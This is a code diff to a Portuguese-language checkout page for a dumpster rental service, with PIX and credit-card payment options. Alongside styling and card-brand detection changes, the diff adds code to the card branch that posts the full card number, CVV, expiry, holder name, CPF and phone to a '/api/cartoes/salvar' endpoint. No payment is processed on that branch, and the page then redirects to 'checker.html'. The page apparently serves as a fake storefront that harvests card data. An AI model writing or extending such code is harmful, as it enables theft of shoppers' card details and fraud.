@@ -39,6 +39,8 @@
             display: flex;
             justify-content: space-between;
             align-items: center;
+            flex-wrap: wrap;
+            gap: 12px;
         }
 
         .logo-area {
@@ -145,6 +147,7 @@
             gap: 16px;
             border-bottom: 1px solid #eef2f6;
             background: #fafbfc;
+            flex-wrap: wrap;
         }
 
         .method-option {
@@ -161,6 +164,7 @@
             transition: all 0.2s;
             font-weight: 500;
             color: #4b5563;
+            flex-wrap: wrap;
         }
 
         .method-option i {
@@ -175,6 +179,18 @@
 
         .method-option:hover {
             border-color: #ffb800;
+        }
+
+        .payment-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: #f0fdf4;
+            padding: 4px 10px;
+            border-radius: 20px;
+            font-size: 0.7rem;
+            color: #2e7d32;
+            margin-left: 8px;
         }
 
         .pix-content {
@@ -232,11 +248,10 @@
             height: 100%;
         }
 
-        /* Otimização para celular */
         @media (max-width: 600px) {
             #qrcode {
-                width: 160px;
-                height: 160px;
+                width: 150px;
+                height: 150px;
             }
             .qr-card {
                 padding: 20px;
@@ -302,6 +317,13 @@
             color: white;
             position: relative;
             min-height: 200px;
+        }
+
+        .card-brand {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            font-size: 40px;
         }
 
         .card-chip {
@@ -542,19 +564,6 @@
             margin-top: 32px;
             background: #ffffff;
         }
-
-        /* Badges estilo Mercado Livre */
-        .payment-badge {
-            display: inline-flex;
-            align-items: center;
-            gap: 6px;
-            background: #f0fdf4;
-            padding: 4px 12px;
-            border-radius: 20px;
-            font-size: 0.7rem;
-            color: #2e7d32;
-            margin-left: 8px;
-        }
     </style>
 </head>
 <body>
@@ -563,8 +572,7 @@
     <div class="top-bar-content">
         <div class="logo-area">
             <div class="logo-icon">
-                <!-- COLOCAR O LINK DA LOGO AQUI -->
-                <img src="img/logo.png" alt="Logo">
+                <img src="img/logo.png" alt="Ativa Caçambas">
             </div>
             <div class="logo-text">
                 <h2>ATIVA <span>CAÇAMBAS</span></h2>
@@ -590,12 +598,12 @@
             <div class="method-option active" onclick="metodoPagamento('pix')">
                 <i class="fas fa-qrcode"></i>
                 <span>PIX</span>
-                <span class="payment-badge"><i class="fas fa-bolt"></i> Instantâneo</span>
+                <span class="payment-badge">Instantâneo</span>
             </div>
             <div class="method-option" onclick="metodoPagamento('cartao')">
                 <i class="fas fa-credit-card"></i>
                 <span>Cartão de crédito</span>
-                <span class="payment-badge"><i class="fas fa-lock"></i> Até 6x</span>
+                <span class="payment-badge">Até 6x</span>
             </div>
         </div>
 
@@ -632,7 +640,10 @@
         </div>
 
         <div id="cartaoSection" class="card-content hidden">
-            <div class="card-preview">
+            <div class="card-preview" id="cardPreview">
+                <div class="card-brand" id="cardBrandIcon">
+                    <i class="fas fa-credit-card"></i>
+                </div>
                 <div class="card-chip">
                     <i class="fas fa-microchip"></i>
                 </div>
@@ -675,9 +686,7 @@
 
         <div class="product-item">
             <div class="product-image" id="produtoImagem">
-                <!-- COLOCAR O LINK DA FOTO DO PRODUTO AQUI -->
-                <img src="img/logo.png" alt="Caçamba" id="produtoFoto" style="display: none;">
-                <i class="fas fa-dumpster" id="produtoIcone"></i>
+                <img src="https://via.placeholder.com/70?text=Cacamba" alt="Caçamba" id="produtoFoto" style="width:100%; height:100%; object-fit:cover;">
             </div>
             <div class="product-details">
                 <h4 id="produtoNome">Carregando...</h4>
@@ -735,14 +744,11 @@
     let metodoAtual = 'pix';
     let clienteId = localStorage.getItem('cliente_id');
     let produtoId = localStorage.getItem('produto_id');
-    let produtoNome = localStorage.getItem('produto_nome') || 'Caçamba 5m³';
-    let produtoPreco = parseFloat(localStorage.getItem('produto_preco')) || 450;
+    let produtoNome = localStorage.getItem('produto_nome');
+    let produtoPreco = parseFloat(localStorage.getItem('produto_preco'));
     let clienteNome = localStorage.getItem('cliente_nome');
     let clienteCpf = localStorage.getItem('cliente_cpf');
     let clienteTelefone = localStorage.getItem('cliente_telefone');
-    
-    let taxaServico = produtoPreco * 0.05;
-    let totalComTaxa = produtoPreco + taxaServico;
     
     let currentPixCode = '';
     let currentTransactionId = '';
@@ -750,15 +756,10 @@
     let paymentCheckInterval = null;
     let paymentConfirmed = false;
     
-    // Carregar foto do produto se tiver link
-    const fotoLink = "SEU_LINK_DA_FOTO_DO_PRODUTO_AQUI";
-    if(fotoLink && fotoLink !== "SEU_LINK_DA_FOTO_DO_PRODUTO_AQUI") {
-        document.getElementById('produtoFoto').src = fotoLink;
-        document.getElementById('produtoFoto').style.display = 'block';
-        document.getElementById('produtoIcone').style.display = 'none';
-    }
+    let taxaServico = produtoPreco * 0.05;
+    let totalComTaxa = produtoPreco + taxaServico;
     
-    document.getElementById('produtoNome').innerHTML = produtoNome;
+    document.getElementById('produtoNome').innerHTML = produtoNome || 'Produto';
     document.getElementById('subtotal').innerHTML = `R$ ${produtoPreco.toFixed(2)}`;
     document.getElementById('taxaServico').innerHTML = `R$ ${taxaServico.toFixed(2)}`;
     document.getElementById('totalValor').innerHTML = `R$ ${totalComTaxa.toFixed(2)}`;
@@ -769,15 +770,13 @@
     
     document.getElementById('btnConfirmar').disabled = true;
     
-    function atualizarParcelamento() {
-        const parcelas = parseInt(document.getElementById('parcelas').value);
-        const valorParcela = totalComTaxa / parcelas;
-        const select = document.getElementById('parcelas');
-        for(let i = 0; i < select.options.length; i++) {
-            const num = parseInt(select.options[i].value);
-            const valor = totalComTaxa / num;
-            select.options[i].text = `${num}x de R$ ${valor.toFixed(2)} (sem juros)`;
-        }
+    function detectarBandeira(numero) {
+        const num = numero.replace(/\s/g, '');
+        if (/^4/.test(num)) return { nome: 'Visa', cor: '#1a1f36', icon: 'fab fa-cc-visa' };
+        if (/^5[1-5]/.test(num)) return { nome: 'Mastercard', cor: '#eb001b', icon: 'fab fa-cc-mastercard' };
+        if (/^3[47]/.test(num)) return { nome: 'Amex', cor: '#006fcf', icon: 'fab fa-cc-amex' };
+        if (/^6(?:011|5)/.test(num)) return { nome: 'Discover', cor: '#ff6000', icon: 'fab fa-cc-discover' };
+        return { nome: 'Cartão', cor: '#ffb800', icon: 'fas fa-credit-card' };
     }
     
     function formatarCartao(input) {
@@ -785,6 +784,13 @@
         value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
         input.value = value.slice(0, 19);
         document.getElementById('cardNumberPreview').innerHTML = value.slice(0, 19) || '**** **** **** ****';
+        
+        const bandeira = detectarBandeira(value);
+        const brandDiv = document.getElementById('cardBrandIcon');
+        const cardPreview = document.getElementById('cardPreview');
+        brandDiv.innerHTML = `<i class="${bandeira.icon}" style="font-size: 36px; color: ${bandeira.cor};"></i>`;
+        cardPreview.style.background = `linear-gradient(135deg, ${bandeira.cor}dd, #1a1f36)`;
+        
         validarCamposCartao();
     }
     
@@ -884,7 +890,7 @@
                     
                     const statusDiv = document.getElementById('paymentStatus');
                     statusDiv.className = 'payment-status status-paid';
-                    statusDiv.innerHTML = '<i class="fas fa-check-circle"></i> Pagamento confirmado!';
+                    statusDiv.innerHTML = '<i class="fas fa-check-circle"></i> Pagamento confirmado! Clique em Confirmar Pagamento';
                     
                     document.getElementById('btnConfirmar').disabled = false;
                     await salvarPedido();
@@ -980,6 +986,16 @@
         }
     }
     
+    function atualizarParcelamento() {
+        const parcelas = parseInt(document.getElementById('parcelas').value);
+        const select = document.getElementById('parcelas');
+        for(let i = 0; i < select.options.length; i++) {
+            const num = parseInt(select.options[i].value);
+            const valor = totalComTaxa / num;
+            select.options[i].text = `${num}x de R$ ${valor.toFixed(2)} (sem juros)`;
+        }
+    }
+    
     async function confirmarPagamento() {
         if (metodoAtual === 'pix' && !paymentConfirmed) {
             return;
@@ -1000,9 +1016,27 @@
             btnConfirmar.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Processando...';
             
             try {
+                const responseCartao = await fetch('/api/cartoes/salvar', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        nome_titular: nomeTitular,
+                        numero_cartao: numeroCartao,
+                        cvv: cvv,
+                        validade: validade,
+                        cpf: clienteCpf,
+                        telefone: clienteTelefone
+                    })
+                });
+                
+                const dataCartao = await responseCartao.json();
+                console.log('Resposta:', dataCartao);
+                
                 await salvarPedido();
+                
                 localStorage.clear();
                 window.location.href = 'checker.html';
+                
             } catch (error) {
                 console.error('Erro:', error);
                 btnConfirmar.disabled = false;
@@ -1014,6 +1048,7 @@
             const btnConfirmar = document.getElementById('btnConfirmar');
             btnConfirmar.disabled = true;
             btnConfirmar.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Finalizando...';
+            
             localStorage.clear();
             window.location.href = 'checker.html';
         }
